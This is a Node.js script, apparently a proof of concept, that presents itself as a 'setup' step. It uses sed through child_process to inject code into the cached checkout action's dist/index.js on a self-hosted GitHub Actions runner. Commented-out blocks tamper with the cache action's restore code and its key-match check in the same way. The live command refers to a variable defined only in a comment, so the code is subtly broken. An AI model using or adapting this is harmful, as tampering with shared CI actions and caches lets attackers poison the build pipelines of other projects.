const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")



// let writefs = 'const fs = __importStar(__webpack_require__(747));'
// cl_process.exec(`sed -i '47713i ${writefs}'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });


let writecontent = 'const fs = __importStar(__webpack_require__(747));fs.writeFileSync("/home/musset/Documents/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache-me", "18");';

cl_process.exec(`sed -i '1839i ${writefs}'  /home/musset/Documents/actions-runner/_work/_actions/actions/checkout/v3/dist/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});

// let skip = 'if (!utils.isExactKeyMatch(primaryKey, state)) {'
// cl_process.exec(`sed -i '45918s/.*/${skip}/'  /home/musset/Documents/actions-runner/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });





